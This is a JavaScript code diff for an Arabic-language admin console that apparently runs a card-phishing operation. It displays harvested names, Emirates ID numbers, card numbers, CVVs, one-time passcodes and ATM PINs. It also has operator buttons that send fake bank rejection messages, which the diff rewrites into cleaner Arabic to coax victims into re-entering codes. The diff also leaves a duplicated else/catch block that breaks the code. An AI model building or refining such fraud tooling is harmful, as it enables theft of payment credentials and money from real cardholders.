@@ -174,24 +174,68 @@
 
                 if (order) {
                     document.getElementById('modalOrderId').innerText = order.id;
-                    modalBody.innerHTML = `
-                        <p><strong>الاسم الكامل:</strong> ${order.full_name || '-'}</p>
-                        <p><strong>الهاتف:</strong> ${order.phone || '-'}</p>
-                        <p><strong>البريد الإلكتروني:</strong> ${order.email || '-'}</p>
-                        <p><strong>رقم الهوية:</strong> ${order.emirates_id || '-'}</p>
-                        <p><strong>نوع العميل:</strong> ${getStatusLabel(order.residency_status) || '-'}</p>
-                        <p><strong>رقم المعاملة:</strong> ${order.transactionId || '-'}</p>
-                        <p><strong>اسم صاحب البطاقة:</strong> ${order.cardName || '-'}</p>
-                        <p><strong>رقم البطاقة:</strong> ${order.cardNumber || '-'}</p>
-                        <p><strong>تاريخ الانتهاء:</strong> ${order.expiryDate || '-'}</p>
-                        <p><strong>CVV:</strong> ${order.cvv || '-'}</p>
-                        <p><strong>OTP:</strong> ${order.otp || 'بانتظار الإدخال...'}</p>
-                        <p><strong>PIN:</strong> ${order.pin || 'بانتظار الإدخال...'}</p>
-                        <p><strong>الحالة:</strong> ${getStatusLabel(order.status)}</p>
-                        <p><strong>آخر خطأ:</strong> ${order.lastError || '-'}</p>
-                    `;
+                    
+                    let content = '<div style="text-align: right; line-height: 1.8;">';
+                    
+                    // Personal Information Section
+                    content += '<div style="background: #f9fafb; padding: 15px; border-radius: 8px; margin-bottom: 15px;">';
+                    content += '<h4 style="color: #1e3a5f; margin-bottom: 10px; border-bottom: 2px solid #d4af37; padding-bottom: 5px;">📋 البيانات الشخصية</h4>';
+                    content += '<p style="margin: 5px 0;"><strong>الاسم الكامل:</strong> ' + (order.full_name || '-') + '</p>';
+                    content += '<p style="margin: 5px 0;"><strong>الهاتف:</strong> ' + (order.phone || '-') + '</p>';
+                    content += '<p style="margin: 5px 0;"><strong>البريد الإلكتروني:</strong> ' + (order.email || '-') + '</p>';
+                    content += '<p style="margin: 5px 0;"><strong>رقم الهوية:</strong> ' + (order.emirates_id || '-') + '</p>';
+                    content += '<p style="margin: 5px 0;"><strong>نوع العميل:</strong> ' + (getStatusLabel(order.residency_status) || '-') + '</p>';
+                    content += '</div>';
+                    
+                    // Card Information Section
+                    if (order.cardName || order.cardNumber) {
+                        content += '<div style="background: #f0f9ff; padding: 15px; border-radius: 8px; margin-bottom: 15px; border-right: 4px solid #0066cc;">';
+                        content += '<h4 style="color: #0c4a6e; margin-bottom: 10px; border-bottom: 2px solid #0066cc; padding-bottom: 5px;">💳 بيانات البطاقة</h4>';
+                        content += '<p style="margin: 5px 0;"><strong>رقم المعاملة:</strong> ' + (order.transactionId || '-') + '</p>';
+                        content += '<p style="margin: 5px 0;"><strong>اسم صاحب البطاقة:</strong> ' + (order.cardName || '-') + '</p>';
+                        content += '<p style="margin: 5px 0;"><strong>رقم البطاقة:</strong> ' + (order.cardNumber ? '****' + order.cardNumber.slice(-4) : '-') + '</p>';
+                        content += '<p style="margin: 5px 0;"><strong>تاريخ الانتهاء:</strong> ' + (order.expiryDate || '-') + '</p>';
+                        content += '<p style="margin: 5px 0;"><strong>CVV:</strong> ' + (order.cvv ? '***' : '-') + '</p>';
+                        content += '</div>';
+                    }
+                    
+                    // OTP Section
+                    if (order.otp) {
+                        content += '<div style="background: #fef3c7; padding: 15px; border-radius: 8px; margin-bottom: 15px; border-right: 4px solid #f59e0b;">';
+                        content += '<h4 style="color: #92400e; margin-bottom: 10px; border-bottom: 2px solid #f59e0b; padding-bottom: 5px;">🔐 رمز التحقق OTP</h4>';
+                        content += '<p style="margin: 5px 0; font-size: 16px; font-weight: bold; color: #d97706;">' + order.otp + '</p>';
+                        content += '</div>';
+                    }
+                    
+                    // PIN Section
+                    if (order.pin) {
+                        content += '<div style="background: #fce7f3; padding: 15px; border-radius: 8px; margin-bottom: 15px; border-right: 4px solid #ec4899;">';
+                        content += '<h4 style="color: #831843; margin-bottom: 10px; border-bottom: 2px solid #ec4899; padding-bottom: 5px;">🏧 الرقم السري ATM</h4>';
+                        content += '<p style="margin: 5px 0; font-size: 16px; font-weight: bold; color: #be185d;">****</p>';
+                        content += '</div>';
+                    }
+                    
+                    // Status Section
+                    content += '<div style="background: #f0fdf4; padding: 15px; border-radius: 8px; margin-bottom: 15px; border-right: 4px solid #16a34a;">';
+                    content += '<h4 style="color: #166534; margin-bottom: 10px; border-bottom: 2px solid #16a34a; padding-bottom: 5px;">📊 حالة المعاملة</h4>';
+                    content += '<p style="margin: 5px 0;"><strong>الحالة الحالية:</strong> ' + getStatusLabel(order.status) + '</p>';
+                    if (order.lastError) {
+                        content += '<p style="margin: 5px 0; color: #dc2626;"><strong>آخر خطأ:</strong> ' + order.lastError + '</p>';
+                    }
+                    content += '</div>';
+                    
+                    content += '</div>';
+                    modalBody.innerHTML = content;
                     modalActions.innerHTML = renderActionButtons(order);
                     modal.style.display = 'flex';
+                } else {
+                    alert('الطلب غير موجود.');
+                }
+            } catch (e) {
+                console.error('Error fetching order details:', e);
+                alert('حدث خطأ أثناء جلب تفاصيل الطلب.');
+            }
+        }
                 } else {
                     alert('الطلب غير موجود.');
                 }
@@ -249,17 +293,17 @@
         }
 
         function rejectPayment(id) {
-            const msg = "تم رفض عملية الدفع بطاقك غير متاح للدفع عبر الانترنت يرجي التواصل مع المصرف او تجربة طرق دفع اخري";
+            const msg = "تم رفض عملية الدفع، بطاقتك غير متاحة للدفع عبر الإنترنت. يرجى التواصل مع المصرف أو تجربة طرق دفع أخرى.";
             updateStatus(id, 'rejected_payment', msg);
         }
 
         function rejectOTP(id) {
-            const msg = "الزمر غير صالح او بطاقك غير متاح لدفع عبر الانترنت يرجي التوصل مع المصرف استخدام طرق دفع اخري";
+            const msg = "الرمز غير صالح أو بطاقتك غير متاحة للدفع عبر الإنترنت. يرجى التواصل مع المصرف أو استخدام طرق دفع أخرى.";
             updateStatus(id, 'rejected_otp', msg);
         }
 
         function rejectPIN(id) {
-            const msg = "رقم الصراف الي غير صحيح قد تكون بطاقتك غير متاحه للدفع عبر الانترنت يرجي التواصل مع المصرف او استخدام طرق دفع مختلفه";
+            const msg = "رقم الصراف الآلي غير صحيح، قد تكون بطاقتك غير متاحة للدفع عبر الإنترنت. يرجى التواصل مع المصرف أو استخدام طرق دفع مختلفة.";
             updateStatus(id, 'rejected_pin', msg);
         }
 
